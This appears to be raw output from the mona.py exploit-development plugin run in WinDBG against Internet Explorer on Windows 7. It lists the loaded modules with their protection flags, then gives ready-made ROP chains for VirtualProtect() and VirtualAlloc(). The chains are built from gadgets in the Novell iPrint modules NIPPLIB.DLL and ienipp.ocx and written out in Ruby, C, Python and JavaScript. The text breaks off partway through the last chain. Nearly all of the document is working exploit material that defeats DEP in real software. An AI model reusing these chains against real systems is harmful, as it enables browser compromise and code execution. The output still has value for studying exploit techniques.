================================================================================
  Output generated by mona.py v2.0, rev 554 - WinDBG
  Corelan Team - https://www.corelan.be
================================================================================
  OS : win7, release 6.1.7600
  Process being debugged : iexplore (pid 1400)
  Current mona arguments: C:\tools\Debugging Tools for Windows (x86)\mona.py rop -m nipplib.dll,ienipp.ocx -cpb '\x00\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8e\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9e\x9f'
================================================================================
  2015-02-17 10:43:57
================================================================================
----------------------------------------------------------------------------------------------------------------------------------
 Module info :
----------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
----------------------------------------------------------------------------------------------------------------------------------
 0x6cb70000 | 0x6d5ec000 | 0x00a7c000 | False  | True    | True  |  True    | True   | 8.0.7600.16385 [IEFRAME.dll] (C:\Windows\system32\IEFRAME.dll)
 0x74a20000 | 0x74a59000 | 0x00039000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MMDevAPI.DLL] (C:\Windows\system32\MMDevAPI.DLL)
 0x77ab0000 | 0x77be5000 | 0x00135000 | False  | True    | True  |  True    | True   | 8.0.7600.16385 [urlmon.dll] (C:\Windows\system32\urlmon.dll)
 0x75470000 | 0x7548c000 | 0x0001c000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [iphlpapi.DLL] (C:\Windows\system32\iphlpapi.DLL)
 0x74d70000 | 0x74e65000 | 0x000f5000 | False  | True    | True  |  True    | True   | 7.0.7600.16385 [propsys.dll] (C:\Windows\system32\propsys.dll)
 0x72ad0000 | 0x72b00000 | 0x00030000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [wdmaud.drv] (C:\Windows\system32\wdmaud.drv)
 0x75da0000 | 0x75deb000 | 0x0004b000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [apphelp.dll] (C:\Windows\system32\apphelp.dll)
 0x76050000 | 0x7616c000 | 0x0011c000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [CRYPT32.dll] (C:\Windows\system32\CRYPT32.dll)
 0x75f10000 | 0x75f1c000 | 0x0000c000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MSASN1.dll] (C:\Windows\system32\MSASN1.dll)
 0x765c0000 | 0x76694000 | 0x000d4000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [kernel32.dll] (C:\Windows\system32\kernel32.dll)
 0x76210000 | 0x762bc000 | 0x000ac000 | False  | True    | True  |  True    | True   | 7.0.7600.16385 [msvcrt.dll] (C:\Windows\system32\msvcrt.dll)
 0x75df0000 | 0x75dfc000 | 0x0000c000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [CRYPTBASE.dll] (C:\Windows\system32\CRYPTBASE.dll)
 0x761b0000 | 0x761fe000 | 0x0004e000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [GDI32.dll] (C:\Windows\system32\GDI32.dll)
 0x74340000 | 0x7436a000 | 0x0002a000 | False  | True    | True  |  True    | True   | 3.10.349.0 [msls31.dll] (C:\Windows\System32\msls31.dll)
 0x74a00000 | 0x74a13000 | 0x00013000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [dwmapi.dll] (C:\Windows\system32\dwmapi.dll)
 0x77d50000 | 0x77e8c000 | 0x0013c000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll)
 0x766a0000 | 0x766b9000 | 0x00019000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [sechost.dll] (C:\Windows\SYSTEM32\sechost.dll)
 0x762c0000 | 0x762c5000 | 0x00005000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [PSAPI.DLL] (C:\Windows\system32\PSAPI.DLL)
 0x036c0000 | 0x0370a000 | 0x0004a000 | True   | False   | False |  False   | True   | 5.5.2.0 [nipplibr.dll] (C:\Windows\system32\iprint\nls\deu\nipplibr.dll)
 0x761a0000 | 0x761aa000 | 0x0000a000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [LPK.dll] (C:\Windows\system32\LPK.dll)
 0x76440000 | 0x764bb000 | 0x0007b000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [comdlg32.dll] (C:\Windows\system32\comdlg32.dll)
 0x01b60000 | 0x01b7a000 | 0x0001a000 | True   | False   | False |  False   | False  | 3.0.0.1 [lftpie.dll] (C:\PROGRA~1\LEAPFT~1.0\lftpie.dll)
 0x775a0000 | 0x77799000 | 0x001f9000 | False  | True    | True  |  True    | True   | 8.0.7600.16385 [iertutil.dll] (C:\Windows\system32\iertutil.dll)
 0x74300000 | 0x74304000 | 0x00004000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [ksuser.dll] (C:\Windows\system32\ksuser.dll)
 0x77a10000 | 0x77aad000 | 0x0009d000 | False  | True    | True  |  True    | True   | 1.626.7600.16385 [USP10.dll] (C:\Windows\system32\USP10.dll)
 0x5c000000 | 0x5c189000 | 0x00189000 | False  | False   | False |  False   | True   | 5.5.2.0 [NIPPLIB.DLL] (C:\Windows\system32\NIPPLIB.DLL)
 0x75460000 | 0x75467000 | 0x00007000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [WINNSI.DLL] (C:\Windows\system32\WINNSI.DLL)
 0x75d80000 | 0x75d9a000 | 0x0001a000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [SspiCli.dll] (C:\Windows\system32\SspiCli.dll)
 0x74480000 | 0x74487000 | 0x00007000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [AVRT.dll] (C:\Windows\system32\AVRT.dll)
 0x75f20000 | 0x75f32000 | 0x00012000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [DEVOBJ.dll] (C:\Windows\system32\DEVOBJ.dll)
 0x75d60000 | 0x75d68000 | 0x00008000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [Secur32.dll] (C:\Windows\System32\Secur32.dll)
 0x77bf0000 | 0x77d4c000 | 0x0015c000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [ole32.dll] (C:\Windows\system32\ole32.dll)
 0x774a0000 | 0x774f7000 | 0x00057000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [SHLWAPI.dll] (C:\Windows\system32\SHLWAPI.dll)
 0x75920000 | 0x75936000 | 0x00016000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [CRYPTSP.dll] (C:\Windows\system32\CRYPTSP.dll)
 0x766f0000 | 0x767b9000 | 0x000c9000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [USER32.dll] (C:\Windows\system32\USER32.dll)
 0x72a00000 | 0x72a08000 | 0x00008000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [msacm32.drv] (C:\Windows\system32\msacm32.drv)
 0x777a0000 | 0x7786c000 | 0x000cc000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MSCTF.dll] (C:\Windows\system32\MSCTF.dll)
 0x708f0000 | 0x70902000 | 0x00012000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MPR.dll] (C:\Windows\system32\MPR.dll)
 0x67540000 | 0x67af2000 | 0x005b2000 | False  | True    | True  |  True    | True   | 8.0.7600.16385 [mshtml.dll] (C:\Windows\System32\mshtml.dll)
 0x73dc0000 | 0x73dee000 | 0x0002e000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MLANG.dll] (C:\Windows\system32\MLANG.dll)
 0x67410000 | 0x674c2000 | 0x000b2000 | False  | True    | True  |  True    | True   | 5.8.7600.16385 [jscript.dll] (C:\Windows\System32\jscript.dll)
 0x756c0000 | 0x756fb000 | 0x0003b000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [rsaenh.dll] (C:\Windows\system32\rsaenh.dll)
 0x674d0000 | 0x6753f000 | 0x0006f000 | False  | True    | True  |  True    | True   | 8.0.6001.18669 [ieapfltr.dll] (C:\Windows\System32\ieapfltr.dll)
 0x75430000 | 0x75451000 | 0x00021000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [ntmarta.dll] (C:\Windows\system32\ntmarta.dll)
 0x729d0000 | 0x729d7000 | 0x00007000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [midimap.dll] (C:\Windows\system32\midimap.dll)
 0x74d30000 | 0x74d70000 | 0x00040000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [uxtheme.dll] (C:\Windows\system32\uxtheme.dll)
 0x74470000 | 0x7447b000 | 0x0000b000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [msimtf.dll] (C:\Windows\system32\msimtf.dll)
 0x767c0000 | 0x7684f000 | 0x0008f000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [OLEAUT32.dll] (C:\Windows\system32\OLEAUT32.dll)
 0x75ea0000 | 0x75eab000 | 0x0000b000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [profapi.dll] (C:\Windows\system32\profapi.dll)
 0x76850000 | 0x77499000 | 0x00c49000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [SHELL32.dll] (C:\Windows\system32\SHELL32.dll)
 0x67b00000 | 0x67b35000 | 0x00035000 | False  | True    | True  |  True    | False  | 8.0.7600.16385 [IEShims.dll] (C:\Program Files\Internet Explorer\IEShims.dll)
 0x76330000 | 0x763d1000 | 0x000a1000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [RPCRT4.dll] (C:\Windows\system32\RPCRT4.dll)
 0x762f0000 | 0x76325000 | 0x00035000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [ws2_32.DLL] (C:\Windows\system32\ws2_32.DLL)
 0x77ef0000 | 0x77f73000 | 0x00083000 | False  | True    | True  |  True    | True   | 2001.12.8530.16385 [CLBCatQ.DLL] (C:\Windows\system32\CLBCatQ.DLL)
 0x74eb0000 | 0x7504e000 | 0x0019e000 | False  | True    | True  |  True    | True   | 6.10.7600.16385 [comctl32.dll] (C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7600.16385_none_421189da2b7fabfc\comctl32.dll)
 0x74eb0000 | 0x7504e000 | 0x0019e000 | False  | True    | True  |  True    | True   | 6.10.7600.16385 [COMCTL32.dll] (C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7600.16385_none_421189da2b7fabfc\comctl32.dll)
 0x764c0000 | 0x765b4000 | 0x000f4000 | False  | True    | True  |  True    | True   | 8.0.7600.16385 [WININET.dll] (C:\Windows\system32\WININET.dll)
 0x77e90000 | 0x77e96000 | 0x00006000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [NSI.dll] (C:\Windows\system32\NSI.dll)
 0x762d0000 | 0x762ef000 | 0x0001f000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [IMM32.DLL] (C:\Windows\system32\IMM32.DLL)
 0x77ea0000 | 0x77ee5000 | 0x00045000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [WLDAP32.dll] (C:\Windows\system32\WLDAP32.dll)
 0x76000000 | 0x7604a000 | 0x0004a000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [KERNELBASE.dll] (C:\Windows\system32\KERNELBASE.dll)
 0x75490000 | 0x75499000 | 0x00009000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [VERSION.dll] (C:\Windows\System32\VERSION.dll)
 0x752d0000 | 0x75302000 | 0x00032000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [WINMM.dll] (C:\Windows\system32\WINMM.dll)
 0x75e60000 | 0x75e6e000 | 0x0000e000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [RpcRtRemote.dll] (C:\Windows\system32\RpcRtRemote.dll)
 0x75f40000 | 0x75f67000 | 0x00027000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [CFGMGR32.dll] (C:\Windows\system32\CFGMGR32.dll)
 0x70b10000 | 0x70b1e000 | 0x0000e000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [SPOOLSS.DLL] (C:\Windows\system32\SPOOLSS.DLL)
 0x757a0000 | 0x757e4000 | 0x00044000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [dnsapi.DLL] (C:\Windows\system32\dnsapi.DLL)
 0x10000000 | 0x1007b000 | 0x0007b000 | False  | False   | False |  False   | True   | 5.5.2.0 [ienipp.ocx] (C:\Windows\system32\ienipp.ocx)
 0x01270000 | 0x01316000 | 0x000a6000 | False  | True    | True  |  False   | False  | 8.0.7600.16385 [iexplore.exe] (C:\Program Files\Internet Explorer\iexplore.exe)
 0x70ab0000 | 0x70b01000 | 0x00051000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [WINSPOOL.DRV] (C:\Windows\system32\WINSPOOL.DRV)
 0x72a00000 | 0x72a08000 | 0x00008000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MSACM32.dll] (C:\Windows\system32\msacm32.drv)
 0x75e00000 | 0x75e5f000 | 0x0005f000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [SXS.DLL] (C:\Windows\system32\SXS.DLL)
 0x77500000 | 0x775a0000 | 0x000a0000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [ADVAPI32.dll] (C:\Windows\system32\ADVAPI32.dll)
 0x74200000 | 0x74236000 | 0x00036000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [AUDIOSES.DLL] (C:\Windows\system32\AUDIOSES.DLL)
 0x77870000 | 0x77a0d000 | 0x0019d000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [SETUPAPI.dll] (C:\Windows\system32\SETUPAPI.dll)
 0x6cb30000 | 0x6cb6c000 | 0x0003c000 | False  | True    | True  |  True    | True   | 7.0.0.0 [OLEACC.dll] (C:\Windows\system32\OLEACC.dll)
 0x73f50000 | 0x73f69000 | 0x00019000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [OLEPRO32.DLL] (C:\Windows\system32\OLEPRO32.DLL)
 0x76200000 | 0x76203000 | 0x00003000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [Normaliz.dll] (C:\Windows\system32\Normaliz.dll)
 0x6a900000 | 0x6a92b000 | 0x0002b000 | False  | True    | True  |  True    | False  | 8.0.7600.16385 [ieproxy.dll] (C:\Program Files\Internet Explorer\ieproxy.dll)
----------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = tr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x5c0ac57e,  # POP EBP # RETN [NIPPLIB.DLL] 
      0x5c0ac57e,  # skip 4 bytes [NIPPLIB.DLL]
      0x1001b6b5,  # POP EAX # RETN [ienipp.ocx] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x5c09cfd3,  # NEG EAX # RETN [NIPPLIB.DLL] 
      0x5c08d949,  # XCHG EAX,EBX # RETN [NIPPLIB.DLL] 
      0x1004b13f,  # POP EAX # RETN [ienipp.ocx] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x5c080337,  # NEG EAX # RETN [NIPPLIB.DLL] 
      0x5c06a72a,  # XCHG EAX,EDX # RETN 0x00 [NIPPLIB.DLL] 
      0x100506cc,  # POP ECX # RETN [ienipp.ocx] 
      0x5c0e58c7,  # &Writable location [NIPPLIB.DLL]
      0x5c09c8ce,  # POP EDI # RETN [NIPPLIB.DLL] 
      0x5c0bd4e3,  # RETN (ROP NOP) [NIPPLIB.DLL]
      0x5c07fae1,  # POP ESI # RETN [NIPPLIB.DLL] 
      0x5c01bbc0,  # JMP [EAX] [NIPPLIB.DLL]
      0x100273d2,  # POP EAX # RETN [ienipp.ocx] 
      0x765c1910,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT kernel32.dll]
      0x5c0839ac,  # PUSHAD # RETN [NIPPLIB.DLL] 
      0x5c0635b2,  # ptr to 'push esp # ret ' [NIPPLIB.DLL]
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x5c0ac57e,  // POP EBP // RETN [NIPPLIB.DLL] 
      0x5c0ac57e,  // skip 4 bytes [NIPPLIB.DLL]
      0x1001b6b5,  // POP EAX // RETN [ienipp.ocx] 
      0xfffffdff,  // Value to negate, will become 0x00000201
      0x5c09cfd3,  // NEG EAX // RETN [NIPPLIB.DLL] 
      0x5c08d949,  // XCHG EAX,EBX // RETN [NIPPLIB.DLL] 
      0x1004b13f,  // POP EAX // RETN [ienipp.ocx] 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x5c080337,  // NEG EAX // RETN [NIPPLIB.DLL] 
      0x5c06a72a,  // XCHG EAX,EDX // RETN 0x00 [NIPPLIB.DLL] 
      0x100506cc,  // POP ECX // RETN [ienipp.ocx] 
      0x5c0e58c7,  // &Writable location [NIPPLIB.DLL]
      0x5c09c8ce,  // POP EDI // RETN [NIPPLIB.DLL] 
      0x5c0bd4e3,  // RETN (ROP NOP) [NIPPLIB.DLL]
      0x5c07fae1,  // POP ESI // RETN [NIPPLIB.DLL] 
      0x5c01bbc0,  // JMP [EAX] [NIPPLIB.DLL]
      0x100273d2,  // POP EAX // RETN [ienipp.ocx] 
      0x765c1910,  // ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT kernel32.dll]
      0x5c0839ac,  // PUSHAD // RETN [NIPPLIB.DLL] 
      0x5c0635b2,  // ptr to 'push esp // ret ' [NIPPLIB.DLL]
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x5c0ac57e,  # POP EBP # RETN [NIPPLIB.DLL] 
      0x5c0ac57e,  # skip 4 bytes [NIPPLIB.DLL]
      0x1001b6b5,  # POP EAX # RETN [ienipp.ocx] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x5c09cfd3,  # NEG EAX # RETN [NIPPLIB.DLL] 
      0x5c08d949,  # XCHG EAX,EBX # RETN [NIPPLIB.DLL] 
      0x1004b13f,  # POP EAX # RETN [ienipp.ocx] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x5c080337,  # NEG EAX # RETN [NIPPLIB.DLL] 
      0x5c06a72a,  # XCHG EAX,EDX # RETN 0x00 [NIPPLIB.DLL] 
      0x100506cc,  # POP ECX # RETN [ienipp.ocx] 
      0x5c0e58c7,  # &Writable location [NIPPLIB.DLL]
      0x5c09c8ce,  # POP EDI # RETN [NIPPLIB.DLL] 
      0x5c0bd4e3,  # RETN (ROP NOP) [NIPPLIB.DLL]
      0x5c07fae1,  # POP ESI # RETN [NIPPLIB.DLL] 
      0x5c01bbc0,  # JMP [EAX] [NIPPLIB.DLL]
      0x100273d2,  # POP EAX # RETN [ienipp.ocx] 
      0x765c1910,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT kernel32.dll]
      0x5c0839ac,  # PUSHAD # RETN [NIPPLIB.DLL] 
      0x5c0635b2,  # ptr to 'push esp # ret ' [NIPPLIB.DLL]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "%uc57e" + // 0x5c0ac57e : ,# POP EBP # RETN [NIPPLIB.DLL] 
    "%uc57e" + // 0x5c0ac57e : ,# skip 4 bytes [NIPPLIB.DLL]
    "%ub6b5%u1001" + // 0x1001b6b5 : ,# POP EAX # RETN [ienipp.ocx] 
    "%ufdff%uffff" + // 0xfffffdff : ,# Value to negate, will become 0x00000201
    "%ucfd3%u5c09" + // 0x5c09cfd3 : ,# NEG EAX # RETN [NIPPLIB.DLL] 
    "%ud949%u5c08" + // 0x5c08d949 : ,# XCHG EAX,EBX # RETN [NIPPLIB.DLL] 
    "%ub13f%u1004" + // 0x1004b13f : ,# POP EAX # RETN [ienipp.ocx] 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%u0337%u5c08" + // 0x5c080337 : ,# NEG EAX # RETN [NIPPLIB.DLL] 
    "%ua72a%u5c06" + // 0x5c06a72a : ,# XCHG EAX,EDX # RETN 0x00 [NIPPLIB.DLL] 
    "%u06cc%u1005" + // 0x100506cc : ,# POP ECX # RETN [ienipp.ocx] 
    "%u58c7%u5c0e" + // 0x5c0e58c7 : ,# &Writable location [NIPPLIB.DLL]
    "%uc8ce%u5c09" + // 0x5c09c8ce : ,# POP EDI # RETN [NIPPLIB.DLL] 
    "%ud4e3%u5c0b" + // 0x5c0bd4e3 : ,# RETN (ROP NOP) [NIPPLIB.DLL]
    "%ufae1%u5c07" + // 0x5c07fae1 : ,# POP ESI # RETN [NIPPLIB.DLL] 
    "%ubbc0%u5c01" + // 0x5c01bbc0 : ,# JMP [EAX] [NIPPLIB.DLL]
    "%u73d2%u1002" + // 0x100273d2 : ,# POP EAX # RETN [ienipp.ocx] 
    "%u1910%u765c" + // 0x765c1910 : ,# ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT kernel32.dll]
    "%u39ac%u5c08" + // 0x5c0839ac : ,# PUSHAD # RETN [NIPPLIB.DLL] 
    "%u35b2%u5c06" + // 0x5c0635b2 : ,# ptr to 'push esp # ret ' [NIPPLIB.DLL]
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x5c0ae14f,  # POP EBP # RETN [NIPPLIB.DLL] 
      0x5c0ae14f,  # skip 4 bytes [NIPPLIB.DLL]
      0x1001b672,  # POP EAX # RETN [ienipp.ocx] 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x5c09cfd3,  # NEG EAX # RETN [NIPPLIB.DLL] 
      0x5c08d949,  # XCHG EAX,EBX # RETN [NIPPLIB.DLL] 
      0x100358e9,  # POP EAX # RETN [ienipp.ocx] 
      0x7fffcffb,  # put delta into eax (-> put 0x00001000 into edx)
      0x10017001,  # ADD EAX,80004005 # RETN 0x08 [ienipp.ocx] 
      0x5c06a72a,  # XCHG EAX,EDX # RETN 0x00 [NIPPLIB.DLL] 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x10014e21,  # POP EAX # RETN [ienipp.ocx] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x5c0abe26,  # NEG EAX # RETN [NIPPLIB.DLL] 
      0x1003eab9,  # XCHG EAX,ECX # POP EDI # ADD EAX,8 # POP ESI # POP EBP # RETN 0x04 [ienipp.ocx] 
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x5c075ffc,  # POP EDI # RETN [NIPPLIB.DLL] 
      0x41414141,  # Filler (RETN offset compensation)
      0x5c0bd4e3,  # RETN (ROP NOP) [NIPPLIB.DLL]
      0x5c076774,  # POP ESI # RETN [NIPPLIB.DLL] 
      0x5c01bbc0,  # JMP [EAX] [NIPPLIB.DLL]
      0x1004b13f,  # POP EAX # RETN [ienipp.ocx] 
      0x765c17f0,  # ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT kernel32.dll]
      0x5c0839e1,  # PUSHAD # RETN [NIPPLIB.DLL] 
      0x5c0635b2,  # ptr to 'push esp # ret ' [NIPPLIB.DLL]
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x5c0ae14f,  // POP EBP // RETN [NIPPLIB.DLL] 
      0x5c0ae14f,  // skip 4 bytes [NIPPLIB.DLL]
      0x1001b672,  // POP EAX // RETN [ienipp.ocx] 
      0xffffffff,  // Value to negate, will become 0x00000001
      0x5c09cfd3,  // NEG EAX // RETN [NIPPLIB.DLL] 
      0x5c08d949,  // XCHG EAX,EBX // RETN [NIPPLIB.DLL] 
      0x100358e9,  // POP EAX // RETN [ienipp.ocx] 
      0x7fffcffb,  // put delta into eax (-> put 0x00001000 into edx)
      0x10017001,  // ADD EAX,80004005 // RETN 0x08 [ienipp.ocx] 
      0x5c06a72a,  // XCHG EAX,EDX // RETN 0x00 [NIPPLIB.DLL] 
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x10014e21,  // POP EAX // RETN [ienipp.ocx] 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x5c0abe26,  // NEG EAX // RETN [NIPPLIB.DLL] 
      0x1003eab9,  // XCHG EAX,ECX // POP EDI // ADD EAX,8 // POP ESI // POP EBP // RETN 0x04 [ienipp.ocx] 
      0x41414141,  // Filler (compensate)
      0x41414141,  // Filler (compensate)
      0x41414141,  // Filler (compensate)
      0x5c075ffc,  // POP EDI // RETN [NIPPLIB.DLL] 
      0x41414141,  // Filler (RETN offset compensation)
      0x5c0bd4e3,  // RETN (ROP NOP) [NIPPLIB.DLL]
      0x5c076774,  // POP ESI // RETN [NIPPLIB.DLL] 
      0x5c01bbc0,  // JMP [EAX] [NIPPLIB.DLL]
      0x1004b13f,  // POP EAX // RETN [ienipp.ocx] 
      0x765c17f0,  // ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT kernel32.dll]
      0x5c0839e1,  // PUSHAD // RETN [NIPPLIB.DLL] 
      0x5c0635b2,  // ptr to 'push esp // ret ' [NIPPLIB.DLL]
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x5c0ae14f,  # POP EBP # RETN [NIPPLIB.DLL] 
      0x5c0ae14f,  # skip 4 bytes [NIPPLIB.DLL]
      0x1001b672,  # POP EAX # RETN [ienipp.ocx] 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x5c09cfd3,  # NEG EAX # RETN [NIPPLIB.DLL] 
      0x5c08d949,  # XCHG EAX,EBX # RETN [NIPPLIB.DLL] 
      0x100358e9,  # POP EAX # RETN [ienipp.ocx] 
      0x7fffcffb,  # put delta into eax (-> put 0x00001000 into edx)
      0x10017001,  # ADD EAX,80004005 # RETN 0x08 [ienipp.ocx] 
      0x5c06a72a,  # XCHG EAX,EDX # RETN 0x00 [NIPPLIB.DLL] 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x10014e21,  # POP EAX # RETN [ienipp.ocx] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x5c0abe26,  # NEG EAX # RETN [NIPPLIB.DLL] 
      0x1003eab9,  # XCHG EAX,ECX # POP EDI # ADD EAX,8 # POP ESI # POP EBP # RETN 0x04 [ienipp.ocx] 
